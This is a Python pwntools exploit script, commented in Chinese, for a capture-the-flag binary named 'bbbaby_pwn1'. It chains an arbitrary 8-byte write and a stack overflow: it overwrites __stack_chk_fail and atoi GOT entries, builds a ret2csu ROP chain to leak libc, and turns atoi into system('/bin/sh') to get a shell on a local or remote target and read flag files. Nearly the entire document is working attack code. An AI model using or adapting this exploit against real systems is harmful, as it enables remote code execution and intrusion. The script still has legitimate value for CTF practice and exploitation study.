#!/usr/bin/env python3
# bbbaby/pwn1: 8 字节任意写 + 可控长度栈溢出
#
# 漏洞面：
#   case 0 -> read(0, (void*)atoi(buf), 8)     任意地址写 8 字节
#   case 1 -> read(0, main_buf(rbp-0x110), n)  n 由输入决定 -> 栈溢出（有 canary）
#
# 打法：
#   1) case 0 把 __stack_chk_fail@got(0x601020) 改成 0x40086a(leave;ret)
#   2) case 1 溢出 main 的 canary/saved rbp/saved ret，选 2 -> main 返回
#      canary 校验失败 -> 跳 leave;ret -> 用我们覆盖的返回地址起 ROP
#      ROP: __libc_csu_init -> puts(read@got) -> main   （leak libc）
#   3) case 0 把 system 写进 atoi@got(0x601040)
#   4) 菜单里发 "/bin/sh" -> read_int 内 atoi(buf) 变成 system("/bin/sh")
import os
import sys

from pwn import *

context.binary = elf = ELF("./bbbaby_pwn1", checksec=False)
context.log_level = "info"

HOST = os.environ.get("HOST")
PORT = int(os.environ.get("PORT", "0"))
LIBC = os.environ.get("LIBC")

MAIN = 0x40090B
LEAVE_RET = 0x40086A
CSU_POP = 0x4009FA          # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x4009E0         # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
STACK_CHK_GOT = 0x601020
ATOI_GOT = 0x601040
READ_GOT = 0x601028
PUTS_GOT = 0x601018

BUF_OFF = 0x110             # main_buf 到 saved rbp 的距离
MENU = b"your choice"


def start():
    if HOST:
        return remote(HOST, PORT)
    proc = process(["./bbbaby_pwn1"])
    return proc


def menu(p, choice):
    p.sendlineafter(MENU, str(choice).encode())


def write8(p, addr, data):
    """case 0：向 addr 写 len(data) 字节（可以少于 8，即部分覆写）。"""
    assert len(data) <= 8
    menu(p, 0)
    p.sendlineafter(b"address:", str(addr).encode())
    p.send(data.ljust(8, b"\x00"))


def overflow(p, chain):
    """case 1：把 chain 铺到 main 的 saved ret 之后。"""
    payload = b"A" * (BUF_OFF - 8) + b"B" * 8 + b"C" * 8 + b"".join(p64(x) for x in chain)
    menu(p, 1)
    p.sendlineafter(b"size:", str(len(payload)).encode())
    p.sendafter(b"content:", payload)


def csu_call(fn_got, a1=0, a2=0, a3=0, ret_to=MAIN):
    """用 __libc_csu_init 调 [fn_got](a1, a2, a3)。"""
    return [
        CSU_POP, 0, 1, fn_got, a3, a2, a1,
        CSU_CALL,
        0, 0, 0, 0, 0, 0, 0,
        ret_to,
    ]


def parse_leak(data, libc):
    """从 ROP 输出里挑出能对齐 libc 页的那一段（跳过残留的换行）。"""
    for seg in data.split(b"\n"):
        if len(seg) < 6:
            continue
        cand = u64(seg.ljust(8, b"\x00"))
        if (cand - libc.symbols["read"]) & 0xFFF == 0:
            return cand
    raise RuntimeError("no usable leak in %r" % data)


def attempt():
    p = start()
    # 1) __stack_chk_fail -> leave; ret
    write8(p, STACK_CHK_GOT, p64(LEAVE_RET))
    # 2) 溢出 + 让 main 返回 -> canary 失败 -> leave;ret -> ROP: puts(read@got) -> main
    overflow(p, csu_call(PUTS_GOT, READ_GOT))
    menu(p, 2)
    data = p.recvuntil(MENU)
    log.info("menu output: %r", data)
    if LIBC:
        libc = ELF(LIBC, checksec=False)
    else:
        libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    leak = parse_leak(data, libc)
    base = leak - libc.symbols["read"]
    system = base + libc.symbols["system"]
    log.success("read=%#x libc=%#x system=%#x", leak, base, system)
    # 3) atoi@got -> system（此时菜单提示已被 recvuntil 消费，直接发选项）
    p.sendline(b"0")
    p.sendlineafter(b"address:", str(ATOI_GOT).encode())
    p.send(p64(system))
    # 4) 菜单里发 /bin/sh -> read_int 里的 atoi(buf) 变成 system("/bin/sh")
    p.sendlineafter(MENU, b"/bin/sh")
    time.sleep(0.3)
    p.sendline(b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit")
    return p


def main():
    for i in range(1, 4):
        try:
            p = attempt()
        except Exception as exc:            # leak 被截断 / 进程提前退出就重连
            log.warning("attempt %d failed: %s", i, exc)
            continue
        try:
            out = p.recvall(timeout=6)
        except EOFError:
            out = b""
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
        if b"__PWNED__" in out:
            print("\n[+] OK: __PWNED__")
            return 0
        log.warning("attempt %d got no __PWNED__", i)
    print("\n[-] FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
